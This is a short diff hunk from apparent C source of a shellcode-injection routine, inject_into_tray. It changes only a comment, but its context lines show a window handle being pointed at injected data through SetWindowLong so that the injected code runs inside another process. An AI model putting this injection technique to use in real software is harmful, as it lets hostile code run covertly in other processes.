@@ -91,7 +91,7 @@ bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
     
     printf("Saving handles to:\t%p\n", remote_handles_ptr);
 
-    //restore the previous value:
+    //set the handle to the injected:
     SetWindowLong(hWnd, DWL_MSGRESULT, (LONG) remote_handles_ptr);
 
     //send signal to execute the injected code
